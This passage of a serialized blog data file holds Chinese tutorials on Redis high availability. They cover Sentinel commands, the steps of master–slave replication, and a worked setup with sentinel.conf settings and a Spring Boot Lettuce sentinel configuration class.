所进行的下线判断已经不再准确。如果 tilt 可以正常维持 30 秒钟， 那么 sentinel 退出 tilt 模式。\n\n\n# sentinel 命令\n\n以下列出的是 sentinel 接受的命令：\n\n命令                                 描述\nping                               如果后面没有参数时返回\n                                   pong，否则会返回后面带的参数。这个命令经常用来测试一个连接是否还是可用的，或者用来测试一个连接的延时。如果客户端处于频道订阅模式下，它将是一个\n                                   multi-bulk 返回，第一次时返回”pong”，之后返回空（empty bulk），除非命令后面更随了参数。\nsentinel masters                   列出所有被监视的 master，以及这些 master 的当前状态。\nsentinel slaves                    列出给定 master 的所有 slave ，以及这些 slave 的当前状态\nsentinel get-master-addr-by-name   返回给定名字的 master 的 ip 地址和端口号。 如果这个 master 正在执行故障转移操作， 或者针对这个\n                                   master 的故障转移操作已经完成， 那么这个命令返回新的 master 的 ip 地址和端口号\nsentinel reset                     重置所有名字和给定模式 pattern 相匹配的 master 。 pattern 参数是一个 glob 风格的模式。\n                                   重置操作清楚 master 目前的所有状态， 包括正在执行中的故障转移， 并移除目前已经发现和关联的， master\n                                   的所有 slave 和 sentinel\nsentinel failover                  当 master 失效时， 在不询问其他 sentinel 意见的情况下， 强制开始一次自动故障迁移\n                                   （不过发起故障转移的 sentinel 会向其他 sentinel 发送一个新的配置，其他 sentinel\n                                   会根据这个配置进行相应的更新）",charsets:{cjk:!0}},{title:"Redis高可用(一) 主从理论",frontmatter:{title:"Redis高可用(一) 主从理论",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1607",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1607.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%B8%80)%20%E4%B8%BB%E4%BB%8E%E7%90%86%E8%AE%BA.html",relativePath:"02.中间件/03.redis/1607.Redis高可用(一) 主从理论.md",key:"v-315575a6",path:"/Redis/1607/",headers:[{level:2,title:"复制",slug:"复制",normalizedTitle:"复制",charIndex:17},{level:2,title:"工作模式",slug:"工作模式",normalizedTitle:"工作模式",charIndex:1895},{level:3,title:"1. 设置主服务的地址与端口",slug:"_1-设置主服务的地址与端口",normalizedTitle:"1. 设置主服务的地址与端口",charIndex:1939},{level:3,title:"2. 建立套接字连接",slug:"_2-建立套接字连接",normalizedTitle:"2. 建立套接字连接",charIndex:2114},{level:3,title:"3. 发送PING命令",slug:"_3-发送ping命令",normalizedTitle:"3. 发送 ping 命令",charIndex:2267},{level:3,title:"4. 身份验证",slug:"_4-身份验证",normalizedTitle:"4. 身份验证",charIndex:2775},{level:3,title:"5. 发送端口信息",slug:"_5-发送端口信息",normalizedTitle:"5. 发送端口信息",charIndex:3304},{level:3,title:"6. 同步 7. 命令传播",slug:"_6-同步-7-命令传播",normalizedTitle:"6. 同步 7. 命令传播",charIndex:3399}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"复制 工作模式 1. 设置主服务的地址与端口 2. 建立套接字连接 3. 发送PING命令 4. 身份验证 5. 发送端口信息 6. 同步 7. 命令传播",content:"Redis 高可用主要是使用 主从复制 和 哨兵来做，集群不能算是高可用，因为当节点 B 有大量的数据，如果节点 B 挂掉，就再无法访问到节点 B 的数据，因为其他节点并不会有节点 B 的数据。其中的原因跟本身 Redis 的设计有关。\n\n\n# 复制\n\n使用和配置主从复制非常简单，从 Redis 服务器（下文称 slave）能精确得复制主 Redis 服务器（下文称 master）的内容。每次当 slave 和 master 之间的连接断开时， slave 会自动重连到 master 上，并且无论这期间 master 发生了什么， slave 都将尝试让自身成为 master 的精确副本。\n这个系统的运行依靠三个主要的机制：\n\n * 当一个 master 实例和一个 slave 实例连接正常时， master 会发送一连串的命令流来保持对 slave 的更新，以便于将自身数据集的改变复制给 slave ，包括客户端的写入、key 的过期或被逐出等等 (增量)。\n * 当 master 和 slave 之间的连接断开之后，因为网络问题、或者是主从意识到连接超时， slave 重新连接上 master 并会尝试进行部分重同步：这意味着它会尝试只获取在断开连接期间内丢失的命令。\n * 当无法进行部分重同步时， slave 会请求进行全量重同步。这会涉及到一个更复杂的过程，例如 master 需要创建所有数据的快照，将之发送给 slave ，之后在数据集更改时持续发送命令到 slave 。\n\nRedis 默认使用异步复制，其特点是低延迟和高性能。slave 服务会异步地确认其从 master 服务器周期接收到的数据量。\n\nRedis 复制的非常重要的事实：\n\n * Redis 使用异步复制，slave 和 master 之间异步确认处理数据。\n * 一个 master 可以拥有多个 slave\n * slave 可以接受其他 slave 的连接。除了多个 slave 可以连接到同一个 master 之外， slave 之间也可以像层叠状的结构连接到其他 slave 。自 Redis 4.0 起，所有的 sub-slave 将会从 master 收到完全一样的复制流。\n\n\n\n * Redis 复制在 master 是非阻塞的。这意味着 master 在一个或多个 slave 进行初次同步或者是部分重同步时，可以继续处理查询请求。\n * 主从复制对于 slave 服务器来说也是非阻塞的，这意味着，即使从 redis 在进行主从复制过程中也可以接受外界的查询请求，只不过这时候 slave 返回的是以前老的数据，如果你不想这样，那么在启动 redis 时，可以在配置文件中进行设置，那么 slave 在复制同步过程中来自外界的查询请求都会返回错误给客户端；（虽然说主从复制过程中对于 slave 是非阻塞的，但是当 slave 从 master 同步过来最新的数据后还需要将新数据加载到内存中，在加载到内存的过程中是阻塞的，在这段时间内的请求将会被阻，但是即使对于大数据集，加载到内存的时间也是比较多的）\n * 主从复制提高了 redis 服务的扩展性，避免单个 redis 服务器的读写访问压力过大的问题，同时也可以给为数据备份及冗余提供一种解决方案；\n * 为了避免 master 服务器写磁盘压力带来的开销，可以配置让 master 不在将数据持久化到磁盘，而是通过连接让一个配置的 slave 服务器及时的将相关数据持久化到磁盘，不过这样会存在一个问题，就是 master 服务器一旦重启，因为 master 服务器数据为空，这时候通过主从同步可能导致从 slave 服务器上的数据也被清空；\n\n> 强烈建议在 master 和在 slave 中启用持久化。否则会有如下问题：\n> 我们设置节点 A 为 master 并关闭它的持久化设置，slave B 和 C 从 节点 A 复制数据。节点 A 崩溃，但是他有一些自动重启的系统可以重启进程。但是由于持久化被关闭了，节点重启后其数据集合为空。节点 B 和 节点 C 会从节点 A 复制数据，但是节点 A 的数据集是空的，因此复制的结果是它们会销毁自身之前的数据副本。\n> 当 Redis Sentinel 被用于高可用并且 master 关闭持久化，这时如果允许自动重启进程也是很危险的。例如， master 可以重启的足够快以致于 Sentinel 没有探测到故障，因此上述的故障模式也会发生。\n\n\n# 工作模式\n\nRedis 不管是旧版还是新版，复制的实现都可以分为七个步骤：\n\n\n\n\n# 1. 设置主服务的地址与端口\n\n127.0.0.1:12345> SLAVEOF 127.0.0.1 6379\n\n\n1\n\n\n当客户端向 slave 器发送以上命令时或者在配置文件中配置 slaveof 选项。slave 将向发送 SLAVEOF 命令的 客户端 返回 OK，表示复制指令已经被接收，而实际上复制工作是在 OK 返回之后进行。\n\n\n# 2. 建立套接字连接\n\n\n\nslave 器根据设置的套接字创建连向 master 的套接字连接。 master 接收 slave 器的套接字连接之后，为该套接字创建响应的客户端状态，并将此时的 slave 器看做是 master 的客户端，也就是该 slave 器同时具备服务器与客户端两个身份。\n\n\n# 3. 发送 PING 命令\n\n\n\nslave 成为 master 的客户端之后，做的第一件事就是向 master 发送 PING 命令。PING 命令主要有两种作用：\n\n * 虽然建立了套接字连接，但是还未使用过，通过发送 PING 命令检查套接字的读写状态是否正常\n * 通过发送 PING 命令检查 master 能否正常处理命令请求\n\nslave 在发送 PING 命令之后将遇到以下三种情况的其中一种：\n\n * master 向 slave 返回一个回复，但是 slave 却不能在规定的会时间（timeout）内读取命令回复的内容，则表示当前主 slave 之间的网络状态连接不佳，不能基础执行复制工作的后续步骤，这时 slave 会断开套接字连接重新创建。\n * master 向 slave 返回一个错误，那么表示 master 暂时没有办法处理 slave 器的命令请求，不能继续执行复制工作的后续步骤，这时 slave 会断开套接字连接重新创建。\n * 如果 slave 读取到 “PONG” 回复，那么表示主从之间网络连接正常，并且 master 可以处理 slave 发送的命令请求。\n\n\n# 4. 身份验证\n\nslave 接收到 master 返回的 “PONG” 回复，接下来就需要考虑身份验证的事。\n\n\n\n如果 slave 设置了 masterauth 选项，那么进行身份验证\n如果 slave 没有设置 masterauth 选项，那么不进行身份验证\nslave 在身份验证的时候可能遇到三种情况\n\n * 主服务没有设置 requirepass 选项，并且 slave 也没有设置 masterquth 选项，那么 master 继续执行 slave 命令，完成复制工作\n * 如果 slave 通过 AUTH 命令发送的密码与 master 中 requirepass 密码相同，那么 master 将继续执行 slave 发送的命令，复制工作继续，与此相反，密码不一致，则会返回 invalid password 错误\n * 如果 slave 没有设置 masterauth 选项，而 master 设置了 requirepass 选项，那么 master 将返回一个 NOAUTH 错误。反之没有设设置 masterauth 选项，而设置了 requirepass 选项，那么会返回 no password is set 错误。\n\n\n# 5. 发送端口信息\n\n在身份验证步骤之后，slave 将执行命令 REPLCONF listening-port <port> ，向 master 发送 slave 的监听端口号。\n\n\n# 6. 同步 7. 命令传播\n\nslave 向 master 发送 PSYNC 命令，执行同步操作，值得注意的是只有 slave 是 master 的客户端，但是执行同步操作之后，master 也会成为 slave 的客户端。\n\nMASTER                                            SLAVE                             备注\n主从完成同步                                            主从完成同步                            主从都启动，并完成同步\nset k1,v1                                         set k1,v1                         master 执行 set 会传播到 slave 进行 set\nset k2,v2                                         set k2,v2                         master 执行 set 会传播到 slave 进行 set\n......                                            ......                            更多的操作\n主从断开连接                                            主从断开连接                            slave 故障停止了同步操作\nset k5002,v5002                                                                     slave 尝试重新连接\nset k5003,v5003                                                                     slave 尝试重新连接\n主从重连接成功                                           主从重连接成功                           主从重连接成功\n                                                  PSYNC                             连接成功，slave 向 master 发送 PSYNC 命令，执行同步，以上第 6 步\n向 slave 返回 + CONTINUE，并执行同步                                                         \n                                                  接收 + CONTINUE                     slave 接收 + CONTINUE，准备执行部分同步\n向 slave 发送 set k5002,v5002 和 set k5003,v5003 命令                                     \n                                                  set k5002,v5002 set k5003,v5003   从接收到命令并执行\n主从完成同步                                            主从完成同步                            同步完成\n\n> 高版本的 Redis slave 默认为只读。",normalizedContent:"redis 高可用主要是使用 主从复制 和 哨兵来做，集群不能算是高可用，因为当节点 b 有大量的数据，如果节点 b 挂掉，就再无法访问到节点 b 的数据，因为其他节点并不会有节点 b 的数据。其中的原因跟本身 redis 的设计有关。\n\n\n# 复制\n\n使用和配置主从复制非常简单，从 redis 服务器（下文称 slave）能精确得复制主 redis 服务器（下文称 master）的内容。每次当 slave 和 master 之间的连接断开时， slave 会自动重连到 master 上，并且无论这期间 master 发生了什么， slave 都将尝试让自身成为 master 的精确副本。\n这个系统的运行依靠三个主要的机制：\n\n * 当一个 master 实例和一个 slave 实例连接正常时， master 会发送一连串的命令流来保持对 slave 的更新，以便于将自身数据集的改变复制给 slave ，包括客户端的写入、key 的过期或被逐出等等 (增量)。\n * 当 master 和 slave 之间的连接断开之后，因为网络问题、或者是主从意识到连接超时， slave 重新连接上 master 并会尝试进行部分重同步：这意味着它会尝试只获取在断开连接期间内丢失的命令。\n * 当无法进行部分重同步时， slave 会请求进行全量重同步。这会涉及到一个更复杂的过程，例如 master 需要创建所有数据的快照，将之发送给 slave ，之后在数据集更改时持续发送命令到 slave 。\n\nredis 默认使用异步复制，其特点是低延迟和高性能。slave 服务会异步地确认其从 master 服务器周期接收到的数据量。\n\nredis 复制的非常重要的事实：\n\n * redis 使用异步复制，slave 和 master 之间异步确认处理数据。\n * 一个 master 可以拥有多个 slave\n * slave 可以接受其他 slave 的连接。除了多个 slave 可以连接到同一个 master 之外， slave 之间也可以像层叠状的结构连接到其他 slave 。自 redis 4.0 起，所有的 sub-slave 将会从 master 收到完全一样的复制流。\n\n\n\n * redis 复制在 master 是非阻塞的。这意味着 master 在一个或多个 slave 进行初次同步或者是部分重同步时，可以继续处理查询请求。\n * 主从复制对于 slave 服务器来说也是非阻塞的，这意味着，即使从 redis 在进行主从复制过程中也可以接受外界的查询请求，只不过这时候 slave 返回的是以前老的数据，如果你不想这样，那么在启动 redis 时，可以在配置文件中进行设置，那么 slave 在复制同步过程中来自外界的查询请求都会返回错误给客户端；（虽然说主从复制过程中对于 slave 是非阻塞的，但是当 slave 从 master 同步过来最新的数据后还需要将新数据加载到内存中，在加载到内存的过程中是阻塞的，在这段时间内的请求将会被阻，但是即使对于大数据集，加载到内存的时间也是比较多的）\n * 主从复制提高了 redis 服务的扩展性，避免单个 redis 服务器的读写访问压力过大的问题，同时也可以给为数据备份及冗余提供一种解决方案；\n * 为了避免 master 服务器写磁盘压力带来的开销，可以配置让 master 不在将数据持久化到磁盘，而是通过连接让一个配置的 slave 服务器及时的将相关数据持久化到磁盘，不过这样会存在一个问题，就是 master 服务器一旦重启，因为 master 服务器数据为空，这时候通过主从同步可能导致从 slave 服务器上的数据也被清空；\n\n> 强烈建议在 master 和在 slave 中启用持久化。否则会有如下问题：\n> 我们设置节点 a 为 master 并关闭它的持久化设置，slave b 和 c 从 节点 a 复制数据。节点 a 崩溃，但是他有一些自动重启的系统可以重启进程。但是由于持久化被关闭了，节点重启后其数据集合为空。节点 b 和 节点 c 会从节点 a 复制数据，但是节点 a 的数据集是空的，因此复制的结果是它们会销毁自身之前的数据副本。\n> 当 redis sentinel 被用于高可用并且 master 关闭持久化，这时如果允许自动重启进程也是很危险的。例如， master 可以重启的足够快以致于 sentinel 没有探测到故障，因此上述的故障模式也会发生。\n\n\n# 工作模式\n\nredis 不管是旧版还是新版，复制的实现都可以分为七个步骤：\n\n\n\n\n# 1. 设置主服务的地址与端口\n\n127.0.0.1:12345> slaveof 127.0.0.1 6379\n\n\n1\n\n\n当客户端向 slave 器发送以上命令时或者在配置文件中配置 slaveof 选项。slave 将向发送 slaveof 命令的 客户端 返回 ok，表示复制指令已经被接收，而实际上复制工作是在 ok 返回之后进行。\n\n\n# 2. 建立套接字连接\n\n\n\nslave 器根据设置的套接字创建连向 master 的套接字连接。 master 接收 slave 器的套接字连接之后，为该套接字创建响应的客户端状态，并将此时的 slave 器看做是 master 的客户端，也就是该 slave 器同时具备服务器与客户端两个身份。\n\n\n# 3. 发送 ping 命令\n\n\n\nslave 成为 master 的客户端之后，做的第一件事就是向 master 发送 ping 命令。ping 命令主要有两种作用：\n\n * 虽然建立了套接字连接，但是还未使用过，通过发送 ping 命令检查套接字的读写状态是否正常\n * 通过发送 ping 命令检查 master 能否正常处理命令请求\n\nslave 在发送 ping 命令之后将遇到以下三种情况的其中一种：\n\n * master 向 slave 返回一个回复，但是 slave 却不能在规定的会时间（timeout）内读取命令回复的内容，则表示当前主 slave 之间的网络状态连接不佳，不能基础执行复制工作的后续步骤，这时 slave 会断开套接字连接重新创建。\n * master 向 slave 返回一个错误，那么表示 master 暂时没有办法处理 slave 器的命令请求，不能继续执行复制工作的后续步骤，这时 slave 会断开套接字连接重新创建。\n * 如果 slave 读取到 “pong” 回复，那么表示主从之间网络连接正常，并且 master 可以处理 slave 发送的命令请求。\n\n\n# 4. 身份验证\n\nslave 接收到 master 返回的 “pong” 回复，接下来就需要考虑身份验证的事。\n\n\n\n如果 slave 设置了 masterauth 选项，那么进行身份验证\n如果 slave 没有设置 masterauth 选项，那么不进行身份验证\nslave 在身份验证的时候可能遇到三种情况\n\n * 主服务没有设置 requirepass 选项，并且 slave 也没有设置 masterquth 选项，那么 master 继续执行 slave 命令，完成复制工作\n * 如果 slave 通过 auth 命令发送的密码与 master 中 requirepass 密码相同，那么 master 将继续执行 slave 发送的命令，复制工作继续，与此相反，密码不一致，则会返回 invalid password 错误\n * 如果 slave 没有设置 masterauth 选项，而 master 设置了 requirepass 选项，那么 master 将返回一个 noauth 错误。反之没有设设置 masterauth 选项，而设置了 requirepass 选项，那么会返回 no password is set 错误。\n\n\n# 5. 发送端口信息\n\n在身份验证步骤之后，slave 将执行命令 replconf listening-port <port> ，向 master 发送 slave 的监听端口号。\n\n\n# 6. 同步 7. 命令传播\n\nslave 向 master 发送 psync 命令，执行同步操作，值得注意的是只有 slave 是 master 的客户端，但是执行同步操作之后，master 也会成为 slave 的客户端。\n\nmaster                                            slave                             备注\n主从完成同步                                            主从完成同步                            主从都启动，并完成同步\nset k1,v1                                         set k1,v1                         master 执行 set 会传播到 slave 进行 set\nset k2,v2                                         set k2,v2                         master 执行 set 会传播到 slave 进行 set\n......                                            ......                            更多的操作\n主从断开连接                                            主从断开连接                            slave 故障停止了同步操作\nset k5002,v5002                                                                     slave 尝试重新连接\nset k5003,v5003                                                                     slave 尝试重新连接\n主从重连接成功                                           主从重连接成功                           主从重连接成功\n                                                  psync                             连接成功，slave 向 master 发送 psync 命令，执行同步，以上第 6 步\n向 slave 返回 + continue，并执行同步                                                         \n                                                  接收 + continue                     slave 接收 + continue，准备执行部分同步\n向 slave 发送 set k5002,v5002 和 set k5003,v5003 命令                                     \n                                                  set k5002,v5002 set k5003,v5003   从接收到命令并执行\n主从完成同步                                            主从完成同步                            同步完成\n\n> 高版本的 redis slave 默认为只读。",charsets:{cjk:!0}},{title:"Redis高可用(三) 搭建",frontmatter:{title:"Redis高可用(三) 搭建",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1609",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1609.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%B8%89)%20%E6%90%AD%E5%BB%BA.html",relativePath:"02.中间件/03.redis/1609.Redis高可用(三) 搭建.md",key:"v-727d91d9",path:"/Redis/1609/",headers:[{level:2,title:"环境",slug:"环境",normalizedTitle:"环境",charIndex:2},{level:2,title:"主从搭建",slug:"主从搭建",normalizedTitle:"主从搭建",charIndex:231},{level:2,title:"哨兵",slug:"哨兵",normalizedTitle:"哨兵",charIndex:794},{level:3,title:"哨兵启动",slug:"哨兵启动",normalizedTitle:"哨兵启动",charIndex:2443},{level:2,title:"spring boot redis 哨兵",slug:"spring-boot-redis-哨兵",normalizedTitle:"spring boot redis 哨兵",charIndex:2599}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"环境 主从搭建 哨兵 哨兵启动 spring boot redis 哨兵",content:'# 环境\n\n考虑到既然是高可用，那么 Sentinel 也得是一个以上。\n\nIP               PORT    部署\n192.168.81.101   6379    Redis6 master\n192.168.81.101   26379   Redis6 Sentinel\n192.168.81.102   6379    Redis6 slave\n192.168.81.102   26379   Redis6 Sentinel\n\n\n\n\n# 主从搭建\n\n为了主从 Redis 安全，密码是必须设置的，否则等着被挖矿吧。在配置文件修改如下：\n主从密码可以一样，方便记忆。\n\nrequirepass ilovejj\n\n\n1\n\n\n设置连接 master 时的认证密码，一搬给 slave 的配置文件设置\n\nmasterauth ilovejj\n\n\n1\n\n\n都启动成功之后在 slave 使用以下命令\n\n127.0.0.1:6379> slaveof 192.168.81.111 6379\nOK\n\n\n1\n2\n\n\n可以从日志里面看到是否启动成功，如果没有启动成功则会一直打印如下，我这里故意弄一个错误的 IP 加以说明。\n\n2187:S 16 Nov 2020 17:19:17.913 # Error condition on socket for SYNC: Operation now in progress\n2187:S 16 Nov 2020 17:19:18.526 * Connecting to MASTER 192.168.81.111:6379\n2187:S 16 Nov 2020 17:19:18.526 * MASTER <-> REPLICA sync started\n\n\n1\n2\n3\n\n\n> 一定要记得加日志，否则以后怎么死的都不知道。\n\n\n# 哨兵\n\n在 Redis 目录下，自带着一个 sentinel.cnf 文件，有着相关 sentinel 配置，我们修改如下：\n\n# 端口默认\nport 26379\ndaemonize yes\nlogfile "/opt/module/redis-6.0.8/log/sentinel.log"\nsentinel monitor mymaster 192.168.81.101 6379 2\nsentinel down-after-milliseconds mymaster 60000\nsentinel failover-timeout mymaster 180000\nsentinel parallel-syncs mymaster 1\nsentinel auth-pass mymaster ilovejj\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 切记哨兵，一定要用的是 master 的 IP，哪怕在同一台服务器上，也要使用 IP，不要使用 127.0.0.1，否则挂掉一台哨兵，salve 可能无法复制。\n\n * daemonize yes 默认 no\n   默认是 no，改为 yes 让在后台运行\n\n * logfile "/opt/module/redis-6.0.8/log/sentinel.log"\n   默认不输出日志，一定要配置日志，否则...\n\n * sentinel monitor mymaster 192.168.81.101 6379 2\n   监视一个名为 mymaster 的主服务器， 这个主服务器的 IP 地址为 192.168.81.101 ， 端口号为 6379 ， 而将这个主服务器判断为失效至少需要 2 个 Sentinel 同意。这里的 mymaster 只是一个匿名，供以下配置使用。\n\n * sentinel down-after-milliseconds mymaster 60000 默认 30000ms\n   如果服务器在给定的毫秒数之内， 没有返回 Sentinel 发送的 PING 命令的回复， 或者返回一个错误， 那么 Sentinel 将这个服务器标记为主观下线（subjectively down，简称 SDOWN ）。\n   不过只有一个 Sentinel 将服务器标记为主观下线并不一定会引起服务器的自动故障迁移： 只有在足够数量的 Sentinel 都将一个服务器标记为主观下线之后， 服务器才会被标记为客观下线（objectively down， 简称 ODOWN ）， 这时自动故障迁移才会执行。\n   将服务器标记为客观下线所需的 Sentinel 数量由对主服务器的配置决定。\n\n * sentinel failover-timeout mymaster 180000 默认 180000ms\n   故障转移时间\n\n * sentinel parallel-syncs mymaster 1 默认 1\n   在执行故障转移时， 最多可以有多少个从服务器同时对新的主服务器进行同步， 这个数字越小， 完成故障转移所需的时间就越长。\n   如果从服务器被设置为允许使用过期数据集（参见对 redis.conf 文件中对 slave-serve-stale-data 选项的说明）， 那么你可能不希望所有从服务器都在同一时间向新的主服务器发送同步请求， 因为尽管复制过程的绝大部分步骤都不会阻塞从服务器， 但从服务器在载入主服务器发来的 RDB 文件时， 仍然会造成从服务器在一段时间内不能处理命令请求： 如果全部从服务器一起对新的主服务器进行同步， 那么就可能会造成所有从服务器在短时间内全部不可用的情况出现。\n   你可以通过将这个值设为 1 来保证每次只有一个从服务器处于不能处理命令请求的状态。\n\n * sentinel auth-pass mymaster ilovejj\n   配置密码\n\n\n# 哨兵启动\n\n我这里哨兵和 redis 实例是同一台，意思就是可以一起使用，不需要在部署一个哨兵。\n\n./redis-server ../sentinel.conf --sentinel\n\n\n1\n\n\n启动后记得查看日志，一些不为人知的配置错误都会在日志里面显示。其中会有一台一直输出和其他哨兵连接的信息。\n\n\n# spring boot redis 哨兵\n\nmaven，只放关于 Redis 的\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-redis</artifactId>\n        </dependency>\n        \n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n配置文件\n\nspring\n  redis:\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ilovejj\n      master: mymaster\n      # 这是我框架自己得一个属性大家忽略\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n配置类\n\npackage com.giant.cloud.config;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.RedisSentinelConfiguration;\nimport org.springframework.data.redis.connection.lettuce.LettuceClientConfiguration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.connection.lettuce.LettucePoolingClientConfiguration;\n\nimport java.util.HashSet;\n\n/**\n * @author big uncle\n * @date 2020/11/17 11:57\n * @module\n **/\n@Configuration\n@Slf4j\n@ConditionalOnExpression("${spring.redis.sentinel.enable:false}")\npublic class RedisSentinelConfig {\n\n\n    @Autowired\n    RedisProperties redisProperties;\n\n    /**\n     * GenericObjectPoolConfig 连接池配置\n     */\n    @Bean\n    public GenericObjectPoolConfig genericObjectPoolConfig() {\n        GenericObjectPoolConfig genericObjectPoolConfig = new GenericObjectPoolConfig();\n        genericObjectPoolConfig.setMaxIdle(redisProperties.getLettuce().getPool().getMaxIdle());\n        genericObjectPoolConfig.setMinIdle(redisProperties.getLettuce().getPool().getMinIdle());\n        genericObjectPoolConfig.setMaxTotal(redisProperties.getLettuce().getPool().getMaxActive());\n        genericObjectPoolConfig.setMaxWaitMillis(redisProperties.getLettuce().getPool().getMaxWait().toMillis());\n        return genericObjectPoolConfig;\n    }\n\n    /**\n     * 哨兵\n    **/\n    @Bean\n    public LettuceConnectionFactory redisConnectionFactory(GenericObjectPoolConfig genericObjectPoolConfig) {\n        RedisSentinelConfiguration redisSentinelConfiguration = new RedisSentinelConfiguration(redisProperties.getSentinel().getMaster(),\n                new HashSet<>(redisProperties.getSentinel().getNodes()));\n        redisSentinelConfiguration.setPassword(redisProperties.getSentinel().getPassword());\n        // 配置池\n        LettuceClientConfiguration clientConfig = LettucePoolingClientConfiguration.builder()\n                .commandTimeout(redisProperties.getTimeout())\n                .poolConfig(genericObjectPoolConfig)\n                .build();\n        LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(redisSentinelConfiguration,clientConfig);\n        log.debug("redis 哨兵启动");\n        return lettuceConnectionFactory;\n    }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n',normalizedContent:'# 环境\n\n考虑到既然是高可用，那么 sentinel 也得是一个以上。\n\nip               port    部署\n192.168.81.101   6379    redis6 master\n192.168.81.101   26379   redis6 sentinel\n192.168.81.102   6379    redis6 slave\n192.168.81.102   26379   redis6 sentinel\n\n\n\n\n# 主从搭建\n\n为了主从 redis 安全，密码是必须设置的，否则等着被挖矿吧。在配置文件修改如下：\n主从密码可以一样，方便记忆。\n\nrequirepass ilovejj\n\n\n1\n\n\n设置连接 master 时的认证密码，一搬给 slave 的配置文件设置\n\nmasterauth ilovejj\n\n\n1\n\n\n都启动成功之后在 slave 使用以下命令\n\n127.0.0.1:6379> slaveof 192.168.81.111 6379\nok\n\n\n1\n2\n\n\n可以从日志里面看到是否启动成功，如果没有启动成功则会一直打印如下，我这里故意弄一个错误的 ip 加以说明。\n\n2187:s 16 nov 2020 17:19:17.913 # error condition on socket for sync: operation now in progress\n2187:s 16 nov 2020 17:19:18.526 * connecting to master 192.168.81.111:6379\n2187:s 16 nov 2020 17:19:18.526 * master <-> replica sync started\n\n\n1\n2\n3\n\n\n> 一定要记得加日志，否则以后怎么死的都不知道。\n\n\n# 哨兵\n\n在 redis 目录下，自带着一个 sentinel.cnf 文件，有着相关 sentinel 配置，我们修改如下：\n\n# 端口默认\nport 26379\ndaemonize yes\nlogfile "/opt/module/redis-6.0.8/log/sentinel.log"\nsentinel monitor mymaster 192.168.81.101 6379 2\nsentinel down-after-milliseconds mymaster 60000\nsentinel failover-timeout mymaster 180000\nsentinel parallel-syncs mymaster 1\nsentinel auth-pass mymaster ilovejj\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 切记哨兵，一定要用的是 master 的 ip，哪怕在同一台服务器上，也要使用 ip，不要使用 127.0.0.1，否则挂掉一台哨兵，salve 可能无法复制。\n\n * daemonize yes 默认 no\n   默认是 no，改为 yes 让在后台运行\n\n * logfile "/opt/module/redis-6.0.8/log/sentinel.log"\n   默认不输出日志，一定要配置日志，否则...\n\n * sentinel monitor mymaster 192.168.81.101 6379 2\n   监视一个名为 mymaster 的主服务器， 这个主服务器的 ip 地址为 192.168.81.101 ， 端口号为 6379 ， 而将这个主服务器判断为失效至少需要 2 个 sentinel 同意。这里的 mymaster 只是一个匿名，供以下配置使用。\n\n * sentinel down-after-milliseconds mymaster 60000 默认 30000ms\n   如果服务器在给定的毫秒数之内， 没有返回 sentinel 发送的 ping 命令的回复， 或者返回一个错误， 那么 sentinel 将这个服务器标记为主观下线（subjectively down，简称 sdown ）。\n   不过只有一个 sentinel 将服务器标记为主观下线并不一定会引起服务器的自动故障迁移： 只有在足够数量的 sentinel 都将一个服务器标记为主观下线之后， 服务器才会被标记为客观下线（objectively down， 简称 odown ）， 这时自动故障迁移才会执行。\n   将服务器标记为客观下线所需的 sentinel 数量由对主服务器的配置决定。\n\n * sentinel failover-timeout mymaster 180000 默认 180000ms\n   故障转移时间\n\n * sentinel parallel-syncs mymaster 1 默认 1\n   在执行故障转移时， 最多可以有多少个从服务器同时对新的主服务器进行同步， 这个数字越小， 完成故障转移所需的时间就越长。\n   如果从服务器被设置为允许使用过期数据集（参见对 redis.conf 文件中对 slave-serve-stale-data 选项的说明）， 那么你可能不希望所有从服务器都在同一时间向新的主服务器发送同步请求， 因为尽管复制过程的绝大部分步骤都不会阻塞从服务器， 但从服务器在载入主服务器发来的 rdb 文件时， 仍然会造成从服务器在一段时间内不能处理命令请求： 如果全部从服务器一起对新的主服务器进行同步， 那么就可能会造成所有从服务器在短时间内全部不可用的情况出现。\n   你可以通过将这个值设为 1 来保证每次只有一个从服务器处于不能处理命令请求的状态。\n\n * sentinel auth-pass mymaster ilovejj\n   配置密码\n\n\n# 哨兵启动\n\n我这里哨兵和 redis 